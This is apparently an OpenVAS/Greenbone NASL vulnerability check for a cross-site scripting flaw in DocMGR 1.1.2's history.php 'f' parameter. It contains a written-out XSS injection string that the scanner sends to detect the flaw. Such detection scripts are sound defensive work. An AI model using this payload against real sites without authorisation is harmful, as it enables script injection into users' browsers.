# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902391");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("DocMGR <= 1.1.2 XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://secunia.com/advisories/44584/");
  script_xref(name:"URL", value:"http://www.naked-security.com/nsa/198631.htm");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101457/docMGR1.1.2-XSS.txt");

  script_tag(name:"insight", value:"The flaw is caused by an input validation error while processing
  the 'f' parameter in 'history.php', allows attackers to send specially crafted HTTP requests to
  the vulnerable application.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"summary", value:"DocMGR is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and scripting code in user's browser in context of a vulnerable website.");

  script_tag(name:"affected", value:"DocMGR version 1.1.2 and prior.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_php( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/docmgr", "/DocMGR", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  res = http_get_cache( item:dir + "/index.php", port:port );

  if( ">Welcome to DocMGR" >< res ) {

    url = dir + '/history.php?f=0");}alert("xss-test");{//';

    req = http_get( item:url, port:port );
    res = http_keepalive_send_recv( port:port, data:req );

    if( res =~ "^HTTP/1\.[01] 200" && '}alert("xss-test");' >< res ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
